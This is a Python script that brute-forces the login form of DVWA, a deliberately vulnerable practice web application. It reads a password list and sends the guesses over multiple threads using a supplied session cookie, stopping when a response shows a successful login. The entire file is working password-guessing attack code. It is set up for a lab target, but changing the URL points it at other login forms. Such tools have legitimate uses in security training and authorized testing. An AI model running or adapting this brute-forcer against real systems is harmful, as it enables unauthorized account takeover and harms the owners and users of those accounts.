#!/usr/bin/python3
import requests
from threading import Thread, BoundedSemaphore
import sys
import getopt

hit = "1"

def banner():
    print("################################")
    print("* DVWA Form BruteForcer     *")
    print("################################")

def usage():
    print("Usage:")
    print("   -w: url (e.g., http://127.0.0.1/dvwa/vulnerabilities/brute/)")
    print("   -u: username")
    print("   -t: threads")
    print("   -f: password list")
    print("   -c: PHPSESSID value") 

class RequestPerformer(Thread):
    def __init__(self, password, user, url, session_id, thread_limiter):
        Thread.__init__(self)
        self.password = password.strip()
        self.username = user
        self.url = url
        self.session_id = session_id
        self.thread_limiter = thread_limiter

    def run(self):
        global hit
        self.thread_limiter.acquire()
        try:
            if hit == "1":
               
                params = {
                    'username': self.username, 
                    'password': self.password, 
                    'Login': 'Login'
                }
                
                # COOKIES
                cookies = {
                    'PHPSESSID': self.session_id, 
                    'security': 'low'
                }

                
                r = requests.get(self.url, params=params, cookies=cookies)
                
               
                if "Welcome" in r.text and "incorrect" not in r.text:
                    hit = "0"
                    print(f"\n[!!!] MATCH FOUND: {self.password}")
                    sys.exit()
                else:
                    # Optional: print invalid attempts
                    # print(f"[-] Invalid: {self.password}")
                    pass
        except Exception as e:
            print(e)
        finally:
            self.thread_limiter.release()

def start(argv):
    banner()
    url = ""
    user = ""
    passlist = ""
    session_id = "" # You can hardcode it here if you prefer
    threads = 1

    if len(sys.argv) < 5:
        usage()
        sys.exit()

    try:
        opts, args = getopt.getopt(argv, "u:w:f:t:c:")
    except getopt.GetoptError:
        print("Error on Arguments")
        sys.exit()

    for opt, arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            passlist = arg
        elif opt == '-t':
            threads = int(arg)
        elif opt == '-c':
            session_id = arg

    if not session_id:
        print("[!] Error: You must provide a PHPSESSID with -c or hardcode it.")
        sys.exit()

    thread_limiter = BoundedSemaphore(value=threads)

    try:
        f = open(passlist, "r")
        passwords = f.readlines()
        f.close()

        print(f"[*] Attacking {user} at {url}...")

        for password in passwords:
            if hit == "1":
                t = RequestPerformer(password, user, url, session_id, thread_limiter)
                t.start()
            else:
                break
    except FileNotFoundError:
        print("[!!] Can't Open Password File")

if __name__ == "__main__":
    start(sys.argv[1:])
